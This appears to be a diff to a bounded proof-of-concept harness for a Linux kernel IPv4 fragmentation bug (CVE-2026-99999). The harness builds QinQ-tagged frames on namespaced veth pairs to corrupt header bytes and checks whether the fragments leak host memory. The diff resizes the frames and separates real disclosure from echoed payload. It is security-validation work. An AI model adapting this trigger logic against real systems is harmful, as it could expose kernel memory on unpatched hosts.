@@ -4,7 +4,7 @@ CVE-2026-99999 (PwnEscape) -- bounded functional validation.
 
 Runs entirely inside a fresh user+network namespace (invoke via: unshare -Urn).
 All traffic stays on two private veth pairs created inside that namespace; two
-QinQ-tagged 98-byte frames are sent (one control, one active). No external
+QinQ-tagged 1622-byte frames are sent (one control, one active). No external
 traffic.
 
 Mechanism (Linux 6.1, pre-fix ip_do_fragment):
@@ -98,8 +98,9 @@ IP_OUT_TX = bytes([10, 9, 0, 2])
 IP_DST = bytes([10, 9, 0, 1])
 IP_SRC = bytes([10, 5, 5, 5])
 
-MTU_EGRESS = 68                # veth minimum MTU; 60 (corrupted header) + 8 data
-DGRAM_LEN = 76                 # 20 IP + 8 UDP + 48 payload
+MTU_INGRESS = 2000
+MTU_EGRESS = 1500              # both control and active produce two fragments
+DGRAM_LEN = 1600               # 20 IP + 8 UDP + 1572 payload
 VLAN_OUTER = 100
 VLAN_INNER = 200
 L2_LEN = 22                    # Ethernet 14 + two 802.1Q headers
@@ -428,8 +429,8 @@ def main():
     if any(name not in idx for name in names):
         out("error", message="veth interfaces not found after creation")
         return
-    link_set(nl, idx["vInTx"], mac=MAC_IN_TX, up=True)
-    link_set(nl, idx["vInRx"], mac=MAC_IN_RX, up=True)
+    link_set(nl, idx["vInTx"], mac=MAC_IN_TX, mtu=MTU_INGRESS, up=True)
+    link_set(nl, idx["vInRx"], mac=MAC_IN_RX, mtu=MTU_INGRESS, up=True)
     link_set(nl, idx["vOutTx"], mac=MAC_OUT_TX, mtu=MTU_EGRESS, up=True)
     link_set(nl, idx["vOutRx"], mac=MAC_OUT_RX, up=True)
     # QinQ raises csum_start from 14 to 22, passing the 6.12 minimum
@@ -532,21 +533,30 @@ def main():
         ihls = sorted({i["ihl"] for i in act_frags})
         corrupted = any(i["ihl"] != 5 for i in act_frags)
         opts = [i["opts"] for i in act_frags if i["opts"]]
-        foreign = b""
+        candidate = b""
         if opts:
-            foreign = opts[0][8:]           # options[0:8] = our UDP header
+            candidate = opts[0][8:]         # options[0:8] = our UDP header
         identical = len({o[8:] for o in opts}) == 1 if opts else None
+        candidate_is_payload = bool(candidate) and candidate in datagram
+        disclosure = bool(candidate) and not candidate_is_payload
         out("active_summary", header_bytes=(",".join("0x%02x" % b for b in b0s)),
             ihls=ihls, corrupted=str(corrupted).lower(),
-            foreign_bytes=len(foreign), foreign_hex=foreign.hex(),
-            fragments_identical=identical)
-        if corrupted:
+            candidate_bytes=len(candidate), candidate_hex=candidate.hex(),
+            candidate_is_controlled_payload=candidate_is_payload,
+            disclosure=str(disclosure).lower(), fragments_identical=identical)
+        if corrupted and disclosure:
             out("verdict", result="CHAIN_CONFIRMED",
                 detail=("late checksum completion corrupted IPv4 header byte0 "
                         "0x45->0x%02x; fragmenter emitted ihl=%d fragments whose "
                         "options carry %d bytes never written by this test "
                         "(head-buffer residue beyond linear data)"
-                        % (act_frags[0]["b0"], act_frags[0]["ihl"], len(foreign))))
+                        % (act_frags[0]["b0"], act_frags[0]["ihl"], len(candidate))))
+        elif corrupted:
+            out("verdict", result="HEADER_CORRUPTION_CONFIRMED_NO_DISCLOSURE",
+                detail=("late checksum completion changed IPv4 byte0 0x45->0x%02x, "
+                        "but the 32 candidate bytes match attacker-controlled "
+                        "payload and are not host-memory disclosure"
+                        % act_frags[0]["b0"]))
         else:
             out("verdict", result="NO_CORRUPTION",
                 detail=("fragments kept IHL=5; this can indicate the fix or a "
